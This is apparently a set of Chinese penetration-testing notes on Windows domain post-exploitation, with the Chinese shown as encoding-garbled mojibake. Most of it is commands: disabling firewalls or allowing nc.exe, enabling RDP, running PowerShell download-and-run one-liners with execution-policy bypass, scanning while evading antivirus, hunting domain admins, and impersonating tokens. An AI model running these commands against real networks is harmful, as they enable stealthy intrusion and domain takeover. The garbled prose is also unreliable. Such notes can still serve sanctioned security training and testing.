'å…³é—­'é˜²ç«å¢™(msfé‡Œé¢ä¹Ÿæœ‰) #1.å¯¹win server 2003ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ netsh firewall set opmode disable #2.win server 2003ä¹‹åçš„ç‰ˆæœ¬ netsh advfirewall set allprofiles state off # è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—å‚¨å­˜ä½ç½® netsh advfirewall set currentprofile logging filename "C:\windows\temp/fw.log" ## 'ä¿®æ”¹'é˜²ç«å¢™ç›¸å…³é…ç½®(æ¯”å…³é—­é˜²ç«å¢™åŠ¨é™å°ï¼Œæ”¹å®Œè®°å¾—æ¢å¤è§„åˆ™) #1.å¯¹win server 2003ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬,å…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ netsh firewall add allowprogram c:\nc.exe "allow nc" enable #2.win server 2003ä¹‹åçš„ç‰ˆæœ¬ å…è®¸æŒ‡å®šç¨‹åºè¿å…¥ netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe" å…è®¸æŒ‡å®šç¨‹åºè¿å‡º netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe" å…è®¸3389ç«¯å£æ”¾è¡Œ netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 15) æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 16) æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡ï¼ˆæ¯”è¾ƒè€çš„çŸ¥è¯†ç‚¹ï¼‰ ##### æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£ Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber ###### å¼€å¯çš„3389æ–¹æ³•ï¼š # 1.é€šç”¨ å¼€3389(ä¼˜åŒ–å)ï¼š wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 2.For Win2003: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # æˆ–è€… wimc path win32_terminalservicesetting where (__CLASS !="") call setallowsconnections 1 # 3.For Win2008: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 4.For Every: cmdå¼€3389 win08 win03 win7 win2012 winxp # win08ï¼Œä¸‰æ¡å‘½ä»¤ï¼›win2012é€šç”¨ï¼›win7å‰ä¸¤æ¡å³å¯(æƒé™éœ€è¦run as administrator): wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 17) è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›† å†™ä¸€ä¸ªè„šæœ¬ï¼ŒæŠŠä¸Šé¢è¦æœé›†çš„ä¿¡æ¯éƒ½è¿›è¡Œ WMIC(winç®¡ç†å·¥å…·å‘½ä»¤è¡Œ)çš„æœé›†ä¿¡æ¯çš„å†™å¥½çš„è„šæœ¬(æ‰§è¡Œè¯¥è„šæœ¬åï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªhtmlæ–‡ä»¶) é“¾æ¥ 18) Empireä¸‹çš„ä¸»æœºä¿¡æ¯æœé›†1.Empireæä¾›äº†ç”¨äºæ”¶é›†ä¸»æœºä¿¡æ¯çš„æ¨¡å—ï¼Œè¾“å…¥å‘½ä»¤usemodoule situational_awareness/host/winenumå³å¯çœ‹åˆ°ä¸€äº›ä¿¡æ¯2.usemodoule situational_awareness/host/computerdetails åŒ…å«äº†å‡ ä¹æ‰€æœ‰æœ‰ç”¨çš„ä¸œè¥¿(ä½†æ˜¯è¿è¡Œè¿™ä¸ªæ¨¡å—éœ€è¦ç®¡ç†å‘˜æƒé™) æŸ¥è¯¢å½“å‰æƒé™ whoami # æŸ¥è¯¢å½“å‰æƒé™ è·å–åˆ°ä¸€å°ä¸»æœºçš„æƒé™åï¼Œæœ‰å¦‚ä¸‹ä¸‰ç§æƒ…å†µï¼š æœ¬åœ°æ™®é€šç”¨æˆ· æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ· ï¼ˆå¯ä»¥ç”¨æ¥æŸ¥è¯¢åŸŸå†…ä¿¡æ¯, æ¯”å¦‚ï¼š net view /xx/yyï¼‰ åŸŸå†…ç”¨æˆ·(åŸŸå\ç”¨æˆ·) æœ¬åœ°ç®¡ç†å‘˜æƒé™é»˜è®¤å’Œç›´æ¥æå‡ä¸ºNtauthorityæˆ–Systemæƒé™ï¼Œå› æ­¤ï¼Œåœ¨åŸŸä¸­ï¼Œé™¤æ™®é€šç”¨æˆ·å¤–ï¼Œæ‰€æœ‰çš„æœºå™¨éƒ½æœ‰ä¸€ä¸ªæœºå™¨ç”¨æˆ·(ç”¨æˆ·åæ˜¯æœºå™¨å+$)ã€‚æœ¬è´¨ä¸Šï¼Œæœºå™¨çš„systemç”¨æˆ·å¯¹åº”çš„å°±æ˜¯åŸŸé‡Œé¢çš„æœºå™¨ç”¨æˆ·ï¼Œæ‰€ä»¥ä½¿ç”¨systemæƒé™å¯ä»¥è¿è¡ŒåŸŸå†…çš„æŸ¥è¯¢å‘½ä»¤ whoami /all # è·å–åŸŸSID net user xxx /domain # æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ å¦‚æœå­˜åœ¨åŸŸï¼Œå°±éœ€è¦åˆ¤æ–­æ‰€æ§ä¸»æœºæ˜¯å¦åœ¨åŸŸå†… å‡ ç§æ–¹æ³•ï¼š # 1. ipconfig /all # å¯ä»¥æŸ¥çœ‹ç½‘å…³IPåœ°å€ã€DNSçš„ipåœ°å€ã€åŸŸåã€æœ¬æœºæ˜¯å¦å’Œdnså¤„åœ¨åŒä¸€ç½‘æ®µ # ç„¶åï¼Œå¯ä»¥é€šè¿‡nslookupåè§£æåŸŸåçš„ipåœ°å€ï¼Œç”¨è§£æå¾—åˆ°çš„ipåœ°å€è¿›è¡Œå¯¹æ¯”ï¼Œåˆ¤æ–­DCå’ŒDNSæ˜¯å¦åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Š # 2.æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯(æœ‰"åŸŸ"çš„å­—æ®µ)ï¼Œå¦‚æœ"åŸŸ"ä¸ºWORKGROUPåˆ™è¡¨ç¤ºå½“å‰æœåŠ¡å™¨ä¸åœ¨åŸŸå†… systeminfo # 3.æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯("å·¥ä½œç«™åŸŸDNSåç§°"ä¸ºåŸŸåï¼Œå¦‚æœä¸ºWORKGROUPåˆ™è¡¨ç¤ºå½“å‰ä¸ºéåŸŸç¯å¢ƒ) # "ç™»å½•åŸŸ"è¡¨ç¤ºå½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·è¿˜æ˜¯æœ¬åœ°ç”¨æˆ· net config workstation # 4.åˆ¤æ–­ä¸»åŸŸ(åŸŸæœåŠ¡å™¨é€šå¸¸ä¼šä½œä¸ºæ—¶é—´æœåŠ¡å™¨ä½¿ç”¨) net time /domain # ä¸‰ç§æƒ…å†µï¼š 1.å­˜åœ¨åŸŸï¼Œå½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ· 2.å­˜åœ¨åŸŸï¼Œå½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ· 3.å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸ åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹ é¿å…é™¤æ³•é˜²ç—…æ¯’è½¯ä»¶æŠ¥è­¦ ä¸è¦ä½¿ç”¨æš´åŠ›çš„; ä¸è¦ä½¿ç”¨å›¾å½¢åŒ–çš„å·¥å…· ä½¿ç”¨powershell/vbsç­‰è‡ªå¸¦çš„ ç™½å¤©ä¸Šç­æ—¶é—´æ¢æµ‹ä¸€éï¼Œæ·±å¤œåˆ†åˆ«æ¢æµ‹ä¸€éï¼ˆå¯¹æ¯”åˆ†æå­˜æ´»ä¸»æœºå¯¹åº”çš„IPåœ°å€iï¼‰ 1.åˆ©ç”¨netbioså¿«é€Ÿæ¢æµ‹ ï¼ˆä¼˜å…ˆä½¿ç”¨è¿™ä¸ªåè®®,ä¼šè¢«è®¤ä¸ºæ˜¯æ­£å¸¸çš„é€šä¿¡ï¼‰å·¥å…·ï¼šnbtbiosä½¿ç”¨æ–¹æ³• # winå’ŒLinuxä¸‹éƒ½æœ‰ # è¿™é‡Œç”¨winç‰ˆæœ¬çš„ï¼Œä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº(æ¨èæ”¾åˆ°ç›®æ ‡æœºå™¨çš„windows/tempä¸‹é¢) nbtscan.exe 192.168.111/24 å‚æ•°è¯´æ˜(ç»“æœçš„ç¬¬ä¸‰åˆ—)ï¼š 2.åˆ©ç”¨icmpåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘å·¥å…·ï¼š1.pingå‘½ä»¤: # forå¾ªç¯pingæ•´ä¸ªç½‘æ®µ for /L %l in (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr "TTL=" 2.VBSè„šæœ¬ æ²¡å†™ # cscript xxx.vbs è¿è¡Œè„šæœ¬ 3.åˆ©ç”¨arpæ‰«æå®Œæ•´æ¢æµ‹å†…ç½‘å·¥å…·ï¼š1.arp-scan # ä¸Šä¼ arp.exe åˆ°ç›®æ ‡æœºå™¨è¿è¡Œ Arp.exe -t 192.168.0/20 2.Empireä¸­çš„arpscanæ¨¡å— usemodule situational_awareness/net/work/arpscan set ... execute 3.NiShangé‡Œé¢çš„è„šæœ¬: Invoke-ARPScan.ps1 # a.è¿œç¨‹ä¸‹è½½è¿è¡Œ powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20" >> C:\windows\temp\log.txt # b.æœ¬åœ°è¿è¡Œ(å…ˆä¸Šä¼ è„šæœ¬åˆ°ç›®æ ‡) powershell.exe -nop -exec bypass -Command "&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}" >> C:\windows\temp\log.txt # c.æ— æ¡ä»¶è¿è¡Œ(æ²¡ç—•è¿¹) 3.åˆ©ç”¨å¸¸è§„tcp/udpç«¯å£æ‰«ææ¢æµ‹å†…ç½‘å·¥å…·ï¼šscanline (æ¯”è¾ƒè€, ä½†æ˜¯å¥½ç”¨ï¼Œå¯åœ¨æ‰€æœ‰winç‰ˆæœ¬ä½¿ç”¨ï¼ŒåŠ¨é™å°) # -t æ˜¯tcpç«¯å£ï¼Œ -uæ˜¯udpç«¯å£ sl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 /b æ‰«æåŸŸå†…ç«¯å£ é€šè¿‡ç«¯å£ï¼Œä¸ä»…èƒ½äº†è§£ç›®æ ‡ä¸»æœºæ‰€å¼€æ”¾çš„æœåŠ¡ï¼Œè¿˜èƒ½æ‰¾å‡ºå…¶å¼€æ”¾æœåŠ¡çš„æ¼æ´ã€åˆ†æç›®æ ‡ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ç­‰ ç«¯å£çš„bannerä¿¡æ¯ ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ å¸¸è§åº”ç”¨çš„é»˜è®¤ç«¯å£ å·¥å…·ï¼š 1.telentå‘½ä»¤(é’ˆå¯¹å•ä¸ªï¼Œè‚¯å®šä¸ä¼šè§¦å‘æŠ¥è­¦)telnet DC1 22 # æŸ¥çœ‹æŸå°ä¸»æœºæŸä¸ªç«¯å£æ˜¯å¦å¼€æ”¾ 2.Sæ‰«æå™¨# æ—©æœŸçš„å·¥å…·ï¼Œæ”¯æŒå¤§ç½‘æ®µ S.exe TCP 192.168.1.1 192.168.1.112 22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001 256 /Banner /save # ç»“æœé»˜è®¤ä¿å­˜åœ¨å®‰è£…ç›®å½•ä¸‹çš„result.txtæ–‡ä»¶ä¸­ 3.Metasploitå†…ç½®çš„ç«¯å£æ‰«ææ¨¡å—:search portscan use auxiliary/scanner/portscan/tcp # è¿˜æœ‰å…¶ä»–æ¨¡å— set ... run 4.PowerSploitä¸‹çš„Invoke-portscan.ps1è„šæœ¬ (ä¸ä¼šä¸‹è½½åˆ°æœ¬åœ°)powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\windows\temp\log.txt" 5.NiShangçš„Invoke-PortScanæ¨¡å—Get-Help Invoke-PortScan -full # ResolveHost è§£æä¸»æœºå Invoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost 6.nmap 7.masscan 8.å…¶ä»–ç«¯å£æ‰«æå·¥å…· æ³¨æ„æ‰«ææ˜¯å¦ä¼šè§¦å‘IDSç­‰è®¾å¤‡ ç«¯å£Bannerä¿¡æ¯ é€šè¿‡æ‰«æå‘ç°äº†ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥å·¥å…·æˆ–ncï¼Œè·å–æœåŠ¡ç«¯çš„Bannerä¿¡æ¯ è·å–Bannerä¿¡æ¯ä¹‹åï¼Œå¯ä»¥åœ¨æ¼æ´åº“ä¸­æŸ¥æ‰¾ç›¸åº”çš„CVEç¼–å·çš„POC/Exp, åœ¨Exploit-DBã€Seebugã€å®‰å…¨ç„¦ç‚¹çš„BugTraq ç­‰å¹³å°æŸ¥çœ‹ç›¸å…³æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œç„¶ååˆ°ç›®æ ‡ç³»ç»Ÿä¸­éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œä»è€Œæœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œå®‰å…¨åŠ å›º å¸¸è§ç«¯å£æœºå™¨æ”»å‡»æ–¹å‘ï¼šé“¾æ¥ æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯ # åŸŸç”¨æˆ·æ‰æœ‰æƒé™è¿›è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼ˆæœ¬æœºçš„systemæƒé™ä¹Ÿå¯ä»¥ï¼Œæœºå™¨çš„ç”¨æˆ·å+$ï¼‰ # æŸ¥è¯¢åŸŸ net view /domain # æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº(å¯é€šè¿‡ä¸»æœºåå¯¹ä¸»æœºè§’è‰²è¿›è¡Œåˆæ­¥åˆ¤å®š, æ¯”å¦‚webå¯èƒ½æ˜¯webæœåŠ¡å™¨) net view /domain:domainName net view /domain:WORKGROUP # æŸ¥çœ‹åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„ net group /domain # æŸ¥çœ‹åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨ net group "domain computers" /domain # è·å–åŸŸå¯†ç ä¿¡æ¯(å¯†ç ç­–ç•¥,å¯†ç é•¿åº¦,é”™è¯¯é”å®šç­‰ä¿¡æ¯) net accounts /domain # è·å–åŸŸä¿¡ä»»ä¿¡æ¯ nltest /domain_trusts æŸ¥æ‰¾ åŸŸæ§åˆ¶å™¨(DC) # æŸ¥çœ‹DCçš„æœºå™¨å nltest /DCLIST:xxx # æŸ¥çœ‹DCçš„ä¸»æœºå nslookup -type=SRV _ldap._tcp # æŸ¥çœ‹å½“å‰æ—¶é—´ net time /domain # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ net group "Domain Controllers"/domain netdom query pdc åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜çš„è·å– 1.æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨ï¼š net user /doamin # å‘DCè¿›è¡ŒæŸ¥è¯¢åŸŸç”¨æˆ·åˆ—è¡¨ wmic useraccount get /all # è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ dsquery user # æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ· # å¸¸ç”¨çš„dsqueryå‘½ä»¤ dsquery computer # æŸ¥æ‰¾ç›®å½•ä¸­çš„è®¡ç®—æœº dsquery contact # æŸ¥æ‰¾ç›®å½•ä¸­çš„è”ç³»äºº dsquery subnet # æŸ¥æ‰¾ç›®å½•ä¸­çš„å­ç½‘ dsquery group # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ dsquery ou # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ç»‡å•ä½ dsquery site # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç«™ç‚¹ dsquery user # æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ· dsquery quota # æŸ¥æ‰¾ç›®å½•ä¸­çš„é…é¢è§„å®š dsquery partition # æŸ¥æ‰¾ç›®å½•ä¸­çš„åˆ†åŒº dsquery * - # ç”¨é€šç”¨çš„ LDAP æŸ¥è¯¢æ¥æŸ¥æ‰¾ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡ net localgroup administrators # æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·(å®é™…ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œä¼šæœ‰åŸŸç”¨æˆ·è¢«è®¾ç½®ä¸ºåŸŸæœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·) 2.æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„ # æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ· net group "doamin admins" /domain # æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„ net group "Enterprise Admins" /domain å®šä½åŸŸç®¡ç†å‘˜ (å¾ˆé‡è¦) å½“ä¸€å°æœºå™¨åŠ å…¥åŸŸåï¼Œä¼šé»˜è®¤ç»™åŸŸç®¡ç†å‘˜ç»„èµ‹äºˆæœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ å¸¸è§„å®šä½åŸŸå†…ç®¡ç†å‘˜æ–¹æ³•ï¼š ç¬¬äºŒç§æ–¹æ³•ä½¿ç”¨è¾ƒå¤š æ—¥å¿— ï¼ˆæœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬æˆ–wevtutilå¯¼å‡ºå¹¶æŸ¥çœ‹ï¼‰ ä¼šè¯ ï¼ˆåŸŸå†…æ¯ä¸ªæœºå™¨çš„ç­‰ä¼šä¼šè¯ï¼Œå¯ä»¥åŒ¿åæŸ¥è¯¢ï¼Œæ— éœ€æƒé™ï¼Œå¯ä»¥ä½¿ç”¨netess.exeæˆ–powerviewç­‰å·¥å…·æŸ¥è¯¢ï¼‰ å¸¸ç”¨çš„å®šä½åŸŸç®¡ç†å‘˜å·¥å…·ï¼š1.psloggedon.exe # ä¸‹è½½åœ°å€ï¼šhttps://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon # æŸ¥çœ‹æœ¬åœ°ç™»å½•çš„ç”¨æˆ· å’Œ é€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºçš„èµ„æºç™»å½•çš„ç”¨æˆ· # å¦‚æœæŒ‡å®šçš„æ˜¯"ç”¨æˆ·å"è€Œä¸æ˜¯è®¡ç®—æœºåï¼Œåˆ™ä¼šæœç´¢ç½‘ä¸Šé‚»å±…çš„è®¡ç®—æœºï¼Œå¹¶æ˜¾ç¤ºè¯¥ç”¨æˆ·å½“å‰æ˜¯å¦å·²ç»ç™»å½• # æŸäº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ psloggedon \\DC1 # - æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„å•ä½ # -l ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½• # -x ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´ # \\computername: æŒ‡å®šè¦åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºname # username: æŒ‡å®šç”¨æˆ·å 2.PVEFindADUser.exe # ä¸‹è½½åœ°å€ï¼š https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn # å¯ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½• # éœ€è¦ .net 2.0, ä¸” éœ€ç®¡ç†å‘˜æƒé™ PVEFindADUser.exe &lt;å‚æ•°> # PVEFindADUser.exe --current # æ˜¾ç¤ºåŸŸä¸­æ‰€æœ‰è®¡ç®—æœºä¸Šå½“å‰ç™»å½•çš„ç”¨æˆ· PVEFindADUser.exe --last # æ˜¾ç¤ºåŸŸä¸­ç›®æ ‡è®¡ç®—æœºä¸Šæœ€åç™»å½•çš„ç”¨æˆ· # å‚æ•° -noping é˜»æ­¢åœ¨ä¹‹å‰ping 4.netsess.exe # æšä¸¾å·¥å…· netsess.exe &lt;å‚æ•°> # -f file.txt æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„æ–‡ä»¶ # -e file.txt æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåçš„æ–‡ä»¶ # -o file.txt å°†æ‰€æœ‰è¾“å‡ºéƒ½é‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ # -d domain æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„åŸŸï¼Œè‹¥æ²¡æŒ‡å®šï¼Œåˆ™ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨ # -g group æŒ‡å®šæœç´¢çš„ç»„åï¼Œè‹¥æ²¡æŒ‡å®šï¼Œå°±ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨ # -c å¯¹å·²æ‰¾åˆ°çš„å…±äº«ç›®å½•/æ–‡ä»¶çš„è®¿é—®æƒé™è¿›è¡Œæ£€æŸ¥ 5.NetView.exe # åœ°å€ï¼š https://github.com/mubix/netview 6.Nmapçš„NSEè„šæœ¬ # ä¸‹è½½åœ°å€ https://nmap.org/nsedoc/scripts/smb-enum-sessions.html smb-enum-session.nse # è·å–è¿œç¨‹æœºå™¨çš„ç™»å½•ä¼šè¯,æŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»å½• smb-enum-domains.nse # è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰ smb-enum-users.nse # å¦‚æœè·å¾—çš„æƒé™æœ‰é™ï¼Œä½¿ç”¨è¿™ä¸ªè·å¾—æ›´å¤šçš„åŸŸç”¨æˆ·çš„ä¿¡æ¯ smb-enum-shares.nse # éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½• smb-enum-processs.nse # å¯¹ä¸»æœºçš„ç³»ç»Ÿè¿›ç¨‹è¿›è¡Œéå†ï¼ˆå¯ä»¥çŸ¥é“ä¸»æœºæ­£åœ¨è¿è¡Œä»€ä¹ˆè½¯ä»¶ï¼‰ smb-os-discovery.nse # æ”¶é›†ç›®æ ‡çš„ä¸€äº›ä¿¡æ¯ 7.PowerShell ä¸­ï¼Œ PowerViewè„šæœ¬ï¼š Invoke-UserHunter # ä¸‹è½½åœ°å€ï¼š https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView # Invoke-StealthUserHunter åªéœ€è¦è¿›è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œå°±å¯ä»¥è·å–åŸŸé‡Œé¢çš„æ‰€æœ‰ç”¨æˆ·(éšè”½æ€§é«˜ï¼Œä½†ä¸ä¸€å®šå…¨é¢) # Invoke-UserHunter æ‰¾åˆ°åŸŸå†…ç‰¹å®šçš„ç”¨æˆ·ç¾¤ï¼Œæ¥æ”¶ç”¨æˆ·åã€ç”¨æˆ·åˆ—è¡¨å’ŒåŸŸç»„æŸ¥è¯¢ powershell -nop -exec bypass -Command "&amp; {Import-Module .\PowerView.ps1; Invoke-UserHunter}" 8.Empireä¸‹user_hunteræ¨¡å— # ä¹Ÿæœ‰ç±»ä¼¼Invoke-UserHunterçš„æ¨¡å—ï¼š user_hunter --> ç”¨äºæŸ¥æ‰¾åŸŸç®¡ç†å‘˜ç™»å½•çš„æœºå™¨ usemodule situational_awareness/network/powerview/user_hunter æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹ å¦‚æœåœ¨æ— æ³•ç«‹å³æ‹¥æœ‰æƒé™çš„ç³»ç»Ÿä¸­è·å¾—ç®¡ç†å‘˜è¿›ç¨‹ï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥é‡‡ç”¨çš„æ–¹æ³•æ˜¯ï¼šåœ¨è·³æ¿æœºä¹‹é—´è·³è½¬ï¼Œç›´è‡³è·å¾—åŸŸç®¡ç†å‘˜æƒé™ï¼ŒåŒæ—¶è¿›è¡Œä¸€äº›åˆ†æå·¥ä½œï¼Œè¿›è€Œæ‰¾åˆ°æµ‹è¯•çš„è·¯å¾„ a.æœ¬æœºæ£€æŸ¥1ï¼è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨ net group "domain admins" /domain 2ï¼åˆ—å‡ºæœ¬æœºæ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ· tasklist /v 3ï¼å¯»æ‰¾æ˜¯å¦æœ‰è¿›ç¨‹æ‰€æœ‰è€…ä¸ºåŸŸç®¡ç†å‘˜çš„è¿›ç¨‹èƒ½ç”¨ä¸Šé¢ä¸¤ç§æ–¹æ³•æ‰¾åˆ°è‡ªç„¶æœ€å¥½ï¼Œä½†å®é™…å¾€å¾€å¹¶éå¦‚æ­¤â€¦â€¦ b.æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„ä¸ç”¨æˆ·ä¼šè¯ï¼ˆè„šæœ¬ï¼‰ æ”¶é›†åŸŸæ§åˆ¶å™¨çš„åˆ—è¡¨# å¯ä»¥ä½¿ç”¨LDAPæŸ¥è¯¢ # net net group "domain Controllers" /domain æ”¶é›†åŸŸç®¡ç†å‘˜çš„åˆ—è¡¨net group "domain Admins" /domain æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸä¼šè¯çš„åˆ—è¡¨ # ä½¿ç”¨Netsess.exeæ’å™æ¯ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œ netsess -h å°†åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨äº¤å‰å¼•ç”¨ï¼Œä»¥ç¡®å®šå“ªäº›IPåœ°å€å…·æœ‰æ´»åŠ¨åŸŸä»¤ç‰Œ# #ä¹Ÿæœ‰å…¶ä»–çš„çš„GDAè„šæœ¬(Get Domain Admins) https://github.com/nullbind/Other-Projects/tree/master/GDA å¦‚æœæ²¡æœ‰ä¼šè¯ï¼š éš”ä¸€æ®µæ—¶é—´ï¼Œç­‰ç€æœ‰ä¼šè¯ / è„šæœ¬è‡ªåŠ¨éš”ä¸€æ®µæ—¶é—´è¿è¡Œ c.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»»åŠ¡å‰æï¼šä½¿ç”¨äº†å…±äº« d.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸ŠNetBISOä¿¡æ¯NetBISOæ˜¯ä¸€ä¸ªåè®®ï¼Œç«¯å£137,138,139ä¹‹ç±»ä¹Ÿå¯ä½¿ç”¨å·¥å…·ï¼šnbtscan æ¨¡æ‹ŸåŸŸç®¡ç†å‘˜çš„æ–¹æ³•å¦‚æœå·²ç»æ‹¥æœ‰äº†meterpreterä¼šè¯ï¼Œå°±å¯ä»¥ä½¿ç”¨Incognitoæ¥æ¨¡æ‹ŸåŸŸç®¡ç†è€…æ·»åŠ ä¸€ä¸ªåŸŸç®¡ç†å‘˜ï¼Œé€šè¿‡å°è¯•éå†ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„æˆæƒä»¤ç‰Œæ¥æ·»åŠ æ–°çš„ç®¡ç†å‘˜ç¬¬å››ç« è§ åˆ©ç”¨ PowerShell æ”¶é›†åŸŸä¿¡æ¯PowerShellPowerShellå¸¸ç”¨çš„æ‰§è¡Œæƒé™å…±æœ‰å››ç§ï¼Œå…·ä½“å¦‚ä¸‹ã€‚ 